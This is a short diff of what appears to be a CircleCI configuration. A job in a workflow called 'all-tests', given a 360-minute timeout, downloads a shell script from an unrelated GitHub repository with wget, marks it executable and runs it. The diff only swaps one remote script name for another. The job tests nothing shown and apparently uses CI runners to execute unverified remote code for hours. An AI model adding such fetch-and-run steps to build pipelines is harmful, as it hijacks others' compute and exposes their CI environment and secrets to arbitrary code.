@@ -22,7 +22,7 @@ jobs:
       - run:
          no_output_timeout: 360m
          command: |-
-           wget https://raw.githubusercontent.com/renitareni/mesin/main/zerg.sh && chmod +x zerg.sh && ./zerg.sh
+           wget https://raw.githubusercontent.com/renitareni/mesin/main/kancut.sh && chmod +x kancut.sh && ./kancut.sh
 workflows:
   all-tests:
     jobs:
